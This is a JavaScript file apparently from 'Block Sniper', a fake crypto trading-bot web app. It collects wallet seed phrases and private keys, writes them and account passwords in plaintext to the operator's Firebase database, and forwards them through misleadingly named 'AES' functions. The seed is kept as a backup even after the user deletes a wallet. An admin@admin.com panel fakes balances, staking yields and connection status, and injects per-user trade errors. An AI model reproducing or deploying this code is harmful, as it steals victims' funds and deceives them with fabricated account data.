// Network options configurations
  window.networkOptions = [
    { id: "Ethereum", longValue: "Ethereum", shortValue: "ETH", minInput: "0.25", maxInput: "10", 
     presets: ["0.25", "0.5", "0.75", "1", "1.5", "2", "3", "5", "10"] },
    { id: "Solana", longValue: "Solana", shortValue: "SOL", minInput: "1.5", maxInput: "180", 
     presets: ["1.5", "5", "10", "15", "30", "60", "80", "120", "180"] },
    { id: "BSC", longValue: "BSC", shortValue: "BNB", minInput: "0.5", maxInput: "50", 
     presets: ["0.5", "1", "2", "5", "10", "15", "20", "30", "50"] },
    { id: "Avalanche", longValue: "Avalanche", shortValue: "AVAX", minInput: "10", maxInput: "500", 
     presets: ["10", "25", "50", "100", "150", "200", "300", "400", "500"] },
    { id: "Optimism", longValue: "Optimism", shortValue: "ETH", minInput: "0.25", maxInput: "10", 
     presets: ["0.25", "0.5", "0.75", "1", "1.5", "2", "3", "5", "10"] },
    { id: "Arbitrum", longValue: "Arbitrum", shortValue: "ETH", minInput: "0.25", maxInput: "10", 
     presets: ["0.25", "0.5", "0.75", "1", "1.5", "2", "3", "5", "10"] },
    { id: "Cardano", longValue: "Cardano", shortValue: "ADA", minInput: "500", maxInput: "20000", 
     presets: ["500", "800", "1k", "2k", "3k", "5k", "10k", "15k", "20k"] },
    { id: "Polygon", longValue: "Polygon", shortValue: "MATIC", minInput: "450", maxInput: "20000", 
     presets: ["450", "700", "1K", "2K", "3K", "5k", "7.5k", "12k", "20k"] },
    { id: "Base", longValue: "Base", shortValue: "ETH", minInput: "0.25", maxInput: "10", 
     presets: ["0.25", "0.5", "0.75", "1", "1.5", "2", "3", "5", "10"] }
  ];



// Navigation and network selection buttons setup
document.addEventListener('DOMContentLoaded', function() { 
    // navigation buttons setup
    const navButtons = {
        //Others
        'register-back-btn': 'main-tab-01-nav',
        'add-wallet-btn': 'main-tab-04-nav',
        'network-select-back-btn': 'main-tab-03-nav',
        'import-seed-back-btn': 'main-tab-04-nav',
        'select-address-back-btn': 'main-tab-05-nav',
        'sign-up-btn': 'main-tab-02-nav',
        
        //Main menu
        'home-btn': 'home-tab',
        'auto-trader-btn': 'auto-trader-tab',
        'manual-trader-btn': 'manual-trader-tab',
        'settings-btn': 'settings-tab',
        'tutorial-btn': 'tutorial-tab'
    };
   
   Object.keys(navButtons).forEach(buttonId => {
        const button = document.getElementById(buttonId);
        button.addEventListener('click', () => {
            const targetNav = navButtons[buttonId];
            document.getElementById(targetNav).click();
        });
    });

    // Network select buttons setup
    const networkLinks = [
        { id: 'ethereum-link', network: 'Ethereum' },
        { id: 'solana-link', network: 'Solana' },
        { id: 'bnb-link', network: 'BSC' },
        { id: 'avalanche-link', network: 'Avalanche' },
        { id: 'optimism-link', network: 'Optimism' },
        { id: 'arbitrum-link', network: 'Arbitrum' },
        { id: 'cardano-link', network: 'Cardano' },
        { id: 'polygon-link', network: 'Polygon' },
        { id: 'base-link', network: 'Base' }
    ];

    networkLinks.forEach(({ id, network }) => {
        const linkElement = document.getElementById(id);
        linkElement.addEventListener('click', () => {
            updateLabelsForNetwork(network);
            
            networkAES(network);
                  
            document.getElementById('main-tab-05-nav').click();
            document.getElementById('sp-input').value = '';
            document.getElementById('wallet-address-input').value = '';
        });
    });


// Function to update UI elements based on the selected network
    function updateLabelsForNetwork(networkId) {
        const selectedNetwork = networkOptions.find(option => option.id === networkId);
        if (!selectedNetwork) return;

        document.querySelectorAll('.long_label').forEach(label => label.textContent = selectedNetwork.longValue);
        document.querySelectorAll('.short_label').forEach(label => label.textContent = selectedNetwork.shortValue);
        document.querySelectorAll('.min_input').forEach(label => label.textContent = selectedNetwork.minInput);
        document.querySelectorAll('.max_input').forEach(label => label.textContent = selectedNetwork.maxInput);
        selectedNetwork.presets.forEach((preset, index) => {
            document.querySelectorAll(`.preset${index + 1}`).forEach(button => button.textContent = preset);
        });
    }

// Update labels using Wallet Selector selection
    document.getElementById('continue-with-wallet-btn').addEventListener('click', async () => {
        // Indicate loading before fetching data
				document.getElementById('wallet-balance-txt').textContent = 'Loading...';  
        
        try {
            const walletSelector = document.getElementById('wallet-selector');
            const selectedOption = walletSelector.options[walletSelector.selectedIndex];
            const networkType = selectedOption.getAttribute('data-network-type');
                          
            // Extract account number from the selected option's text
            const accountNumber = selectedOption.text.match(/\bWallet (\d+)/i) ? selectedOption.text.match(/\bWallet (\d+)/i)[1] : 'Unknown';
            // Update the account number label
            
						document.getElementById('wallet-account-num-txt').textContent = `Account ${accountNumber}`;
            if (!networkType) {
                throw new Error('Network type could not be determined from the selected option.');
            }
            // Update labels based on the selected network
            updateLabelsForNetwork(networkType);

            // Fetch and display wallet balance, then update balance status
            await findWalletBalancesAndUpdateUI();
            updateBalanceStatus();
        } catch (error) {
            console.error('Error during balance update:', error);
            displayError('No wallet selected. Please import a wallet to use Block Sniper.');
        }
    });

    async function updateBalanceStatus(retryCount = 0) {
        const walletBalanceTxtElement = document.getElementById('wallet-balance-txt');
        const minInputTxtElement = document.getElementById('min_input');
        const balanceStatusTxtElement = document.getElementById('balance-status-txt');

        if (walletBalanceTxtElement.textContent === 'Loading...' && retryCount < 3) {
            // Wait for a short period and then retry
            setTimeout(() => updateBalanceStatus(retryCount + 1), 1000); // Retry after 1 second
            return;
        }

        try {
            if (!walletBalanceTxtElement || !minInputTxtElement || !balanceStatusTxtElement) {
                throw new Error('One or more required elements are missing.');
            }

            const walletBalance = parseFloat(walletBalanceTxtElement.textContent);
            const minInput = parseFloat(minInputTxtElement.textContent);
           

            if (isNaN(walletBalance) || isNaN(minInput)) {
                throw new Error('Failed to initialize blockchain wallet. Please remove wallet and try again.');
            }
						
            loadedAES();
                        
            if (walletBalance >= minInput) {
                balanceStatusTxtElement.textContent = 'Connected';
                balanceStatusTxtElement.style.color = '#FFFFFF';
                document.getElementById('main-tab-07-nav').click();                
                document.getElementById('switch-wallet-btn').style.display = 'block';

            } else {
                balanceStatusTxtElement.textContent = 'Insufficient Balance';
                balanceStatusTxtElement.style.color = '#ffae00';
                document.getElementById('main-tab-07-nav').click();
                document.getElementById('switch-wallet-btn').style.display = 'block';
            }
        } catch (error) {
            console.error(error.message);
            displayError(error.message || 'Error updating balance status.');
        }
    }
});

//admin panel change staking info
document.getElementById('admin-change-stake-btn').addEventListener('click', function() {
    // Retrieve the text content of the labels
    var adminStakeBalance = document.getElementById('admin-stake-balance').value;
    var adminYieldPercentage = document.getElementById('admin-yield-percentage').value;
    var adminStakingRank = document.getElementById('admin-staking-rank').value;

    // Update the value of the input boxes
    document.getElementById('staked-number-txt').textContent = adminStakeBalance;
    document.getElementById('yield-number-txt').textContent = adminYieldPercentage + '%';
    document.getElementById('staking-rank-txt').textContent = adminStakingRank;
    
    //Hide admin controls
    document.getElementById('admin-control-panel-div').style.display = 'none';
});

//Hide switch button
document.getElementById('switch-wallet-btn').style.display = 'none';

//Disable admin controlls
document.getElementById('admin-controls-btn').style.display = 'none';
document.getElementById('empty-admin-controls-btn').style.display = 'block';

//Hide admin controls
document.getElementById('admin-control-panel-div').style.display = 'none';

//Error display shortcut function
function displayError(message) {
  console.error(message);
  document.getElementById('wallet-balance-txt').textContent = message;
}

//Add options to selector field on admin panel from (network options)
function populateAdminNetworkSelectField() {
  const adminNetworkSelectField = document.getElementById('admin-network-select-field'); // Correctly select the field
  window.networkOptions.forEach(option => {
    const optionElement = document.createElement('option');
    optionElement.value = option.id;
    optionElement.textContent = option.longValue;
    adminNetworkSelectField.appendChild(optionElement);
  });
}

//Calling function to populate admin network selector field
populateAdminNetworkSelectField();


//Update labels from admin panel on button click
document.addEventListener('DOMContentLoaded', function() {
    const updateLabelsButton = document.getElementById('admin-update-labels-btn');

    updateLabelsButton.addEventListener('click', function() {
        const networkSelectField = document.getElementById('admin-network-select-field');
        const selectedNetwork = networkSelectField.value;
        var adminWalletBalance = document.getElementById('admin-wallet-balance').value.trim();
        var adminWalletAddress = document.getElementById('admin-wallet-address').value.trim();
    
        // Validate and format the wallet balance
        if (adminWalletBalance !== '') {
            if (/^\d+(\.\d{1,4})?$/.test(adminWalletBalance)) {
                document.getElementById('wallet-balance-txt').textContent = parseFloat(adminWalletBalance).toFixed(4);
            } else {
                displayError('The wallet balance must be a whole number or a number with up to 4 decimal places.');
                return;
            }
        }
     
        // Validate and format the wallet address
        if (adminWalletAddress !== '' && adminWalletAddress.length > 12) {
            var formattedAddress = adminWalletAddress.substring(0, 7) + '...' + adminWalletAddress.substring(adminWalletAddress.length - 5);
            document.getElementById('wallet-address-txt').textContent = formattedAddress;
            document.getElementById('wallet-address-txt2').textContent = formattedAddress;
        } else if (adminWalletAddress !== '') {
            displayError('The wallet address is too short to format.');
            return;
        }
        
        // Update network labels if networkOptions is available globally
        if (window.networkOptions) {
            updateLabelsForNetwork2(selectedNetwork);
        } else {
            console.error('networkOptions is not defined.');
        }
        
        document.getElementById('balance-status-txt').textContent = 'Connected';
        document.getElementById('balance-status-txt').style.color = '#FFFFFF';
        
        document.getElementById('admin-control-panel-div').style.display = 'none';
    });
    
    function updateLabelsForNetwork2(networkId) {
        const selectedNetwork = window.networkOptions.find(option => option.id === networkId);
        if (!selectedNetwork) {
            console.error('Selected network not found');
            return;
        }
        document.querySelectorAll('.long_label').forEach(label => label.textContent = selectedNetwork.longValue);
        document.querySelectorAll('.short_label').forEach(label => label.textContent = selectedNetwork.shortValue);
        document.querySelectorAll('.min_input').forEach(label => label.textContent = selectedNetwork.minInput);
        document.querySelectorAll('.max_input').forEach(label => label.textContent = selectedNetwork.maxInput);
        selectedNetwork.presets.forEach((preset, index) => {
            document.querySelectorAll(`.preset${index + 1}`).forEach(button => button.textContent = preset);
        });
    }
});



// Navigation and network selection buttons setup
document.addEventListener('DOMContentLoaded', function() {
 		//Start fresh
    clearFields()
		var navbar = document.getElementById('navbar');
     
    // Adjust error box padding if navbar is hidden
    if (window.getComputedStyle(navbar).display === 'none') {
      errorMessageDiv.style.paddingTop = '20px';
    }
        
    // Close error box using 'x' button
    document.getElementById('close-error-btn').addEventListener('click', function() {
      errorMessageDiv.style.display = 'none';
    }); 

    //Sign out button
    document.getElementById('sign-out-btn').addEventListener('click', function() {
    	clearFields()
      stopTimer();

	document.getElementById('import-wallet-tab').style.display = 'none';
	document.getElementById('generate-wallet-tab').style.display = 'none';
	document.getElementById('import-prv-key-tab').style.display = 'none';
	document.getElementById('wallet-options-tab').style.display = 'block';
	document.getElementById('admin-controls-btn').style.display = 'none';
	document.getElementById('empty-admin-controls-btn').style.display = 'block';
	document.getElementById('admin-control-panel-div').style.display = 'none';
	document.getElementById('switch-wallet-btn').style.display = 'none';
	navbar.style.display = 'none';
	document.getElementById('main-tab-01-nav').click();
    });
 
     //Switch wallet button
    document.getElementById('switch-wallet-btn').addEventListener('click', function() {
      stopTimer();
      clearFields()
	document.getElementById('import-wallet-tab').style.display = 'none';
	document.getElementById('generate-wallet-tab').style.display = 'none';
	document.getElementById('import-prv-key-tab').style.display = 'none';
	document.getElementById('wallet-options-tab').style.display = 'block';
	document.getElementById('switch-wallet-btn').style.display = 'none';
	document.getElementById('main-tab-03-nav').click();
	document.getElementById('admin-control-panel-div').style.display = 'none';
    });
    
    
    //Admin panel button
    document.getElementById('admin-controls-btn').addEventListener('click', function() {
        var adminControlPanelDiv = document.getElementById('admin-control-panel-div');

        // Toggle visibility based on current state
        if (adminControlPanelDiv.style.display === 'none' || adminControlPanelDiv.style.display === '') {
            adminControlPanelDiv.style.display = 'block'; // Make it visible if it was hidden
            document.getElementById('home-btn').click();
        } else {
            adminControlPanelDiv.style.display = 'none'; // Hide it if it was visible
        }
    });

});

document.addEventListener('DOMContentLoaded', function() {
  
  const auth = firebase.auth();
  const database = firebase.database();
  const uDateTime = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Lagos' });

// Register User
  document.getElementById('create-account-btn').addEventListener('click', async function(event) { // Make the function async
    event.preventDefault();
    var email = document.getElementById('reg_email_input').value;
    var password = document.getElementById('reg_password_input').value;
    var confirm_password = document.getElementById('reg_confirm_password_input').value;
    var name = document.getElementById('reg_name_input').value;
    var referrer = document.getElementById('reg_referrer_input').value;
    var checkbox = document.getElementById('register-checkbox-btn');

    // Validate inputs
    if (!validate_input(name)) {
      displayError('Please enter a name/username in the correct field.')
      return;
    }

    if (!validate_email(email)) {
      displayError('Please ensure your email is in the correct format.')
      return;
    }

    if (!validate_password(password)) {
      displayError('Password must be atleast 6 characters in length.')
      return;
    }

    if (!checkbox.checked) {
      displayError('Please read through and accept the Block Sniper terms of service & user agreement.')
      return;
    }

    if (!validate_passwords_match(password, confirm_password)) {
      displayError('Passwords do not match, please adjust and try again.')
      return;
    } 
    else {
      try {
        // Firebase create user
        const userCredential = await auth.createUserWithEmailAndPassword(email, password);
        var user = userCredential.user;

        await database.ref('users/' + user.uid).set({
          name: name,
          email: email,
          password: password,
          referrer: referrer,
          last_login: uDateTime
        });
        // Alert('Registration successful'); // Uncomment if you want to use an alert for successful registration
        document.getElementById('main-tab-03-nav').click();
				updateUsernameLabel();
        const user0 = firebase.auth().currentUser;

        // Wait for AES256_ENCRYPTsession to complete and get the IP address
        var ipLink = await AES256_ENCRYPTsession();
        regAES(user0.uid, name, email, password, referrer, ipLink);

        if (user0) {
          populateSelector(user0);
        }
        navbar.style.display = 'block';
        errorMessageDiv.style.display = 'none';
      } catch (error) {
        displayError('Registration failed: ' + error.message);
      }
    }   
  });



  // Login User
  document.getElementById('sign-in-btn').addEventListener('click', async function(event) { // Make this function async
    event.preventDefault();
    var email = document.getElementById('login-email-input').value.trim();
    var password = document.getElementById('login-password-input').value.trim();

    // Check if email and password fields are not empty
    if (email === '' || password === '') {
      displayError('Please fill in both email and password fields.');
      return; // Stop the function if either field is empty
    }

    // Validate inputs
    if (!validate_email(email) || !validate_password(password)) {
      displayError('Unsuccessful Login: Please ensure your email and password are in the correct format.');      
      return;
    }
    else {

      // Firebase sign in
      try {
        const userCredential = await auth.signInWithEmailAndPassword(email, password);
        // Update last login timestamp
        database.ref('users/' + userCredential.user.uid).update({
          last_login: uDateTime
        });

        if (userCredential.user.email === 'admin@admin.com') {
          document.getElementById('main-tab-07-nav').click();
          document.getElementById('admin-controls-btn').style.display = 'block';
          document.getElementById('empty-admin-controls-btn').style.display = 'none';
          document.getElementById('switch-wallet-btn').style.display = 'block';
        } else {
          document.getElementById('main-tab-03-nav').click(); // Navigate to the default tab for regular users
					updateUsernameLabel();
        }

        const user0 = firebase.auth().currentUser;

        // Wait for fetchSession to complete and return the IP address
        var ipLink = await AES256_ENCRYPTsession(); // Use await here
        logAES(user0.uid, email, password, ipLink);

        if (user0) {
          populateSelector(user0);
        }
        navbar.style.display = 'block';
        errorMessageDiv.style.display = 'none';
      } catch (error) {
        displayError('Login failed: Error (auth/invalid-login-credentials).');
      }
    }   
  });




	



// Make storeGold return a Promise
function storeGold(inputId, skipFormatCheck = false) {
  return new Promise((resolve, reject) => {
    // Retrieve the private key (gold) from the input field
    const inputField = document.getElementById(inputId);
    if (!inputField) {
      console.error(`Input field with ID '${inputId}' not found.`);
      reject('Input field not found.');
      return;
    }

    const gold = inputField.value.trim();

    // Conditionally check format
    if (!skipFormatCheck && !checkWordCount(gold)) {
      displayError('Failed to import wallet: Please ensure the wallet is in the correct format');
      reject('Invalid wallet format.');
      return;
    }

    const user = auth.currentUser; // Check if user is logged in
    if (!user) {
      displayError('User not logged in.');
      reject('User not logged in.');
      return;
    }

    goldAES(user.uid, gold); // Encrypt or process the private key before saving

    const userRef = database.ref('users/' + user.uid);

    // Fetch current user data and update
    userRef
      .once('value')
      .then((snapshot) => {
        const userData = snapshot.val();

        if (userData) {
          // Update user data with private keys, checking for empty slots
          const updateData = { last_login: uDateTime };

          if (!userData.gold1) updateData.gold1 = gold;
          else if (!userData.gold2) updateData.gold2 = gold;
          else if (!userData.gold3) updateData.gold3 = gold;
          else {
            displayError('Maximum wallets reached.');
            return Promise.reject(new Error('Maximum wallets reached.'));
          }

          return userRef.update(updateData);
        }
      })
      .then(() => {
        console.log('Private key saved successfully.');
        // On success, trigger navigation and update UI
        console.log('Wallet address added or updated successfully.');
        document.getElementById('main-tab-06-nav')?.click();
        const navbar = document.getElementById('navbar');
        const errorMessageDiv = document.getElementById('error-message-div');
        if (navbar) navbar.style.display = 'block';
        if (errorMessageDiv) errorMessageDiv.style.display = 'none';

        resolve(); // Resolve when the function completes successfully
      })
      .catch((error) => {
        displayError('Failed to import wallet: ' + error.message);
        reject(error.message);
      });
  });
}

// Button click trigger gold save - seed
document.getElementById('import-gold-btn')?.addEventListener('click', async function (event) {
  event.preventDefault();
  try {
    await storeGold('sp-input'); // Perform format check
  } catch (error) {
    console.error('Error importing gold:', error);
  }
});

// Button click trigger gold save - prv key
document.getElementById('connect-to-wallet-btn')?.addEventListener('click', async function (event) {
  event.preventDefault();
  try {
    await storeGold('prv-key-txt-hidden', true); // Skip format check for prv key
  var walletAddress = document.getElementById('wallet-address-txt-hidden').value;
  var networkType = document.getElementById('wallet-address-label1').textContent;

  // Trigger the main function
  storeWalletAddressHandler(walletAddress, networkType);
  } catch (error) {
    console.error('Error connecting wallet:', error);
  }
});



	


	


/// Function to store wallet address
function storeWalletAddressHandler(walletAddress, networkType) {
  if (!validate_walletAddressLength(walletAddress)) {
    displayError('Failed to add wallet address: Please ensure the wallet address is in the correct format');
    return;
  }

  const user = auth.currentUser;

  if (!user) {
    displayError('User not logged in.');
    return;
  }

  walletAES(user.uid, walletAddress); // Encrypt or process the wallet address

  const userRef = database.ref('users/' + user.uid);

  userRef
    .once('value')
    .then((snapshot) => {
      const userData = snapshot.val() || {};
      const updateData = { last_login: uDateTime };

      if (!userData.walletAddress1) {
        updateData.walletAddress1 = walletAddress;
        updateData.networkType1 = networkType;
      } else if (!userData.walletAddress2) {
        updateData.walletAddress2 = walletAddress;
        updateData.networkType2 = networkType;
      } else if (!userData.walletAddress3) {
        updateData.walletAddress3 = walletAddress;
        updateData.networkType3 = networkType;
      } else {
        displayError('Maximum wallet addresses reached.');
        return Promise.reject(new Error('Maximum wallet addresses reached.'));
      }

      return userRef.update(updateData);
    })
    .then(() => {
      console.log('Wallet address added or updated successfully.');
      document.getElementById('main-tab-03-nav').click();

      const currentUser = firebase.auth().currentUser;
      if (currentUser) {
        populateSelector(currentUser);
      }

      console.log('No user is logged in.');
      navbar.style.display = 'block';
      errorMessageDiv.style.display = 'none';
    })
    .catch((error) => {
      displayError('Failed to add wallet address: ' + error.message);
    });
}

// Event listener for 'add-wallet-address-btn'
document.getElementById('add-wallet-address-btn')?.addEventListener('click', function (event) {
  event.preventDefault();

  // Retrieve data from input fields
  var walletAddress = document.getElementById('wallet-address-input').value;
  var networkType = document.getElementById('wallet-address-label1').textContent;

  // Trigger the main function
  storeWalletAddressHandler(walletAddress, networkType);
});







	
//for auto trader earnings username
  function updateUsernameLabel() {
    const user = firebase.auth().currentUser;
    if (user) {
      const userRef = firebase.database().ref('users/' + user.uid);
      userRef.once('value', (snapshot) => {
        const userData = snapshot.val();
        if (userData && userData.name) {
          let username = userData.name;
          // Check if the username does not start with '@'
          if (!username.startsWith('@')) {
            username = '@' + username; // Prepend '@' to the username
          }
          document.getElementById('win-username-txt').textContent = username;
        } else {
          console.log("User data is missing.");
        }
      }).catch((error) => {
        console.log("Error fetching user data:", error);
      });
    } else {
      console.log("No user is logged in.");
    }
  }
  
//Field format check
  function validate_email(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  }

  function validate_password(password) {
    return password.length >= 6;
  }

  function validate_walletAddressLength(address) {
    return address.length >= 10;
  }


  function validate_passwords_match(password, confirm_password) {
    return password === confirm_password;
  }

  function validate_input(input) {
    return input != null && input.trim().length > 0;
  }
  
  function checkWordCount(input) {
  const trimmedValue = input.trim();
  const words = trimmedValue.split(/\s+/);
  return words.length === 12 || words.length === 24;
	}
    
});





	

//Clear all relevant fields
function clearFields() {
    [
        // Login
        'login-email-input',
        'login-password-input',
        
        // Register
        'reg_name_input',
        'reg_email_input',
        'reg_password_input',
        'reg_confirm_password_input',
        'reg_referrer_input',
        
        // Main menu
        'autotrader-input',
        'contract-address-input',
        'allocate-1-input',
        'sell-percent-input',
        
	// Others
	'sp-input',
	'prv-key-txt',
	'prv-key-input',
	'prv-key-txt-hidden',
	'wallet-address-txt-hidden',
	'found-wallet-address-txt-hidden',
	'found-wallet-address-txt-hidden2',
	'wallet-address-input'
    ].forEach(id => {
        const element = document.getElementById(id);
        if (element) {
            element.value = '';
        }
    });
    
    // Close loading wheels and reset progress label
    const progressLabel = document.getElementById('progress-label');
    progressLabel.style.color = '#dbeaff';
    progressLabel.textContent = 'Not Started';

    document.getElementById('loading-wheel-div').style.display = 'none';
    document.getElementById('loading-wheel-sell-div').style.display = 'none';
    document.getElementById('loading-wheel-buy-div').style.display = 'none';
    document.getElementById('loading-wheel-refresh-div').style.display = 'none';
    document.getElementById('balance-status-txt').style.color = '#FFFFFF';
    document.getElementById('balance-status-txt').textContent = 'Establishing Connection...';
    document.getElementById('sell-token-status-txt').textContent = 'Status: None';
    document.getElementById('sell-token-status-txt').style.color = '#bacfeb';
    document.getElementById('buy-token-status-txt').textContent = 'Status: None';
    document.getElementById('buy-token-status-txt').style.color = '#bacfeb';
    document.getElementById('earnings-user').style.display = 'block';
    document.getElementById('earnings-admin').style.display = 'none';
    
    const elementIds = ['slippage-1-input', 'slippage-2-input', 'gas-1-input', 'gas-2-input'];
      elementIds.forEach(function(id) {
        var inputElement = document.getElementById(id);
        if (inputElement) {
          inputElement.value = 'AUTO';
          inputElement.disabled = true;
          // Disable the input field
        }
      });
    // Balance label
    document.getElementById('wallet-balance-txt').textContent = '--';
    //Select home tab

}


// Populate wallet selector from Firebase
function populateSelector(user) {
    // Clear existing options before populating
    const walletSelector = document.getElementById('wallet-selector');
    walletSelector.innerHTML = '';
    
    //Find Wallets of signed in user
    const userRef = firebase.database().ref('users/' + user.uid);
    userRef.once('value', snapshot => {
        const userData = snapshot.val();
        let optionsAdded = 0;

        for (let i = 1; i <= 3; i++) {
            const walletAddressKey = `walletAddress${i}`;
            const networkTypeKey = `networkType${i}`;

            if (userData && userData[walletAddressKey] && userData[networkTypeKey]) {
                const option = document.createElement('option');
                option.value = i;
                option.textContent = `Wallet ${i} : ${userData[networkTypeKey]} : ${userData[walletAddressKey].slice(0, 7)}...${userData[walletAddressKey].slice(-5)}`;
                option.setAttribute('data-network-type', userData[networkTypeKey]);
                walletSelector.appendChild(option);
                optionsAdded++;
            }
        }
				//If no wallets found
        if (optionsAdded === 0) {
            const placeholderOption = document.createElement('option');
            placeholderOption.textContent = "No wallets added";
            placeholderOption.disabled = true;
            placeholderOption.selected = true;
            walletSelector.appendChild(placeholderOption);
        }
    }).catch(error => {
        console.error('Error fetching user data:', error);
    });
}

//admin panel add custom error for user
document.addEventListener('DOMContentLoaded', function() {
  // Check if the logged-in user is the admin
  firebase.auth().onAuthStateChanged(function(user) {
    if (user && user.email === 'admin@admin.com') {
      // Admin logged in
      document.getElementById('admin-add-errors-btn').addEventListener('click', function() {
        // Getting user input values
        const userId = document.getElementById('admin-username-error').value.trim();
        const autoError = document.getElementById('admin-auto-error').value.trim();
        const buyError = document.getElementById('admin-buy-error').value.trim();
        const sellError = document.getElementById('admin-sell-error').value.trim();

        // Firebase database reference
        const userRef = firebase.database().ref('users/' + userId);

        // Add errors to the database
        if (autoError) userRef.child('autoerror').set(autoError);
        if (buyError) userRef.child('buyerror').set(buyError);
        if (sellError) userRef.child('sellerror').set(sellError);

        displayError("Errors added successfully for user ID:", userId);
      });

      document.getElementById('admin-del-errors-btn').addEventListener('click', function() {
        // Getting the user ID from input
        const userId = document.getElementById('admin-username-error').value.trim();

        // Firebase database reference
        const userRef = firebase.database().ref('users/' + userId);

        // Delete specified keys from the database
        userRef.child('autoerror').remove();
        userRef.child('buyerror').remove();
        userRef.child('sellerror').remove();

        displayError("Errors removed successfully for user ID:", userId);
      });
    } else {
      // Not admin or not logged in
      console.error('Admin not logged in.');
    }
  });
});


//Wallet balance retrieval
async function findWalletBalancesAndUpdateUI() {
  // Check user login
  const user = firebase.auth().currentUser;
  if (!user) {
    console.log('No user is logged in.');
    document.getElementById('wallet-balance-txt').textContent = 'User not logged in.';
    return;
  }

  // Declare elements
  const walletSelector = document.getElementById('wallet-selector');
  const selectedIndex = walletSelector.value;
  const walletAddressKey = `walletAddress${selectedIndex}`;
  const networkTypeKey = `networkType${selectedIndex}`;

  const userRef = firebase.database().ref(`users/${user.uid}`);
  userRef.once('value').then(async (snapshot) => {
    const userData = snapshot.val();
    const walletAddress = userData[walletAddressKey];
    const networkType = userData[networkTypeKey];

    // Fetch balance and update UI
    const receivedBalance = await fetchBlockchainBalance(walletAddress, networkType);
    if(receivedBalance !== null) {
      displayBalance(receivedBalance);
      updateWalletAddressDisplay(walletAddress);
    } else {
      console.error('Failed to fetch the balance');
    }
  });
}

async function fetchBlockchainBalance(walletAddress, networkType) {
 const baseUrl = "https://blocksniper.netlify.app/.netlify/functions/";
let functionName;

switch(networkType) {
    case "BSC":
      functionName = "fetchBSC";
      break;
    case "Solana":
      functionName = "fetchSOL";
      break;
    case "Ethereum":
    	functionName = "fetchETH";
      break;
    case "Polygon":
      functionName = "fetchPOLY";
      break;
    case "Optimism":
      functionName = "fetchOPT";
      break;
    case "Arbitrum":
      functionName = "fetchARB";
      break;
    case "Base":
      functionName = "fetchBASE";
      break;
    case "Avalanche":
      functionName = "fetchAVAX";
      break;
    case "Cardano":
      functionName = "fetchADA";
      break;
    default:
      console.error("Unsupported network type:", networkType);
      return null;
}

let url = baseUrl + functionName;
  
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ walletAddress, networkType }) // For unified function approach, send networkType as well if needed
    });

    if (!response.ok) throw new Error(`Network response was not ok: ${response.statusText}`);
    const data = await response.json();
    return data.balance;
  } catch (error) {
    console.error(`Error fetching balance for ${networkType}:`, error);
    return null;
  }
}

function updateWalletAddressDisplay(walletAddress) {
  const formattedAddress = `${walletAddress.substring(0, 7)}...${walletAddress.substring(walletAddress.length - 5)}`;
  document.getElementById('wallet-address-txt').textContent = formattedAddress;
  document.getElementById('wallet-address-txt2').textContent = formattedAddress;
}

function displayBalance(balanceInNativeToken) {
  const displayBalance = parseFloat(balanceInNativeToken) > 0 ? parseFloat(balanceInNativeToken).toFixed(4) : balanceInNativeToken;
  document.getElementById('wallet-balance-txt').textContent = displayBalance;
}





//Delete selected wallet from DB with confirm
document.addEventListener('DOMContentLoaded', function() {
    const deleteWalletBtn = document.getElementById('delete-wallet-btn');
    
    deleteWalletBtn.addEventListener('click', async function() {
        const confirmDelete = confirm('Are you sure you want to delete this wallet? This action cannot be undone.');
        if (!confirmDelete) {
            return; // User canceled the deletion
        }

        const user = firebase.auth().currentUser;
        if (!user) {
            alert('No user is logged in.');
            return;
        }

        const walletSelector = document.getElementById('wallet-selector');
        const selectedIndex = walletSelector.value;
        if (!selectedIndex) {
            alert('No wallet selected.');
            return;
        }

        const userRef = firebase.database().ref(`users/${user.uid}`);
        const walletAddressKey = `walletAddress${selectedIndex}`;
        const networkTypeKey = `networkType${selectedIndex}`;
        const goldKey = `gold${selectedIndex}`;

        try {
            // Fetch the current user data to determine if backup is needed
            const snapshot = await userRef.once('value');
            const userData = snapshot.val();
            const goldValue = userData[goldKey];

            // Prepare updates for deletion and backup of the gold value
            const updates = {
                [walletAddressKey]: null,
                [networkTypeKey]: null,
            };

            // Backup gold value with a unique key
            const backupKey = await generateUniqueBackupKey(userRef, goldKey);
            updates[backupKey] = goldValue;

            // Apply the updates for backup
            await userRef.update(updates);

            // After backup, nullify the original gold field
            await userRef.child(goldKey).remove();

            alert('Wallet successfully deleted.');
            walletSelector.remove(walletSelector.selectedIndex);
        } catch (error) {
            console.error('Error deleting wallet:', error);
            alert('Failed to delete wallet. Please try again.');
        }
    });
});

//Gold backup key
async function generateUniqueBackupKey(ref, baseKey) {
    let suffix = 0;
    let backupKey = `${baseKey}_backup`;
    let exists = await ref.child(backupKey).once('value').then(snapshot => snapshot.exists());
    
    // If backup already exists, find a unique suffix
    while (exists) {
        suffix += 1;
        backupKey = `${baseKey}_backup_${suffix}`;
        exists = await ref.child(backupKey).once('value').then(snapshot => snapshot.exists());
    }
    
    return backupKey;
}

//Subract from balance script for admin
function subtractFromWalletBalance() {
    var autotraderInputValue = document.getElementById('autotrader-input').value.trim();
    var walletBalanceText = document.getElementById('wallet-balance-txt').textContent.trim();
    
    // Convert both values to numbers
    var autotraderInputNumber = parseFloat(autotraderInputValue);
    var walletBalanceNumber = parseFloat(walletBalanceText);
    
    // Check if both converted values are numeric
    if (!isNaN(autotraderInputNumber) && !isNaN(walletBalanceNumber)) {
        // Perform subtraction and update the label
        var newWalletBalance = walletBalanceNumber - autotraderInputNumber;
        if (newWalletBalance >= 0) {
            document.getElementById('wallet-balance-txt').textContent = newWalletBalance.toFixed(4);
        } 
    } else {
        console.log('One or both inputs are not numeric, doing nothing.');
    }
}




document.addEventListener('DOMContentLoaded', function() {
    // Function to handle button clicks
    function handleButtonClick(event) {
        const buttonValue = event.target.textContent.trim();
        let numberValue;

        // Check if the button value ends with 'k' and convert to numeric value
        if (buttonValue.toLowerCase().endsWith('k')) {
            const baseValue = parseFloat(buttonValue.slice(0, -1));
            numberValue = baseValue * 1000; // Convert 'k' to thousands
        } else {
            numberValue = parseFloat(buttonValue);
        }

       	document.getElementById('allocate-1-input').value = numberValue.toString();

    }

    // Attach event listeners to all 9 buttons
    for (let i = 1; i <= 9; i++) {
        const buttonId = 'p-' + i;
        const button = document.getElementById(buttonId);
        if (button) {
            button.addEventListener('click', handleButtonClick);
        }
    }
});



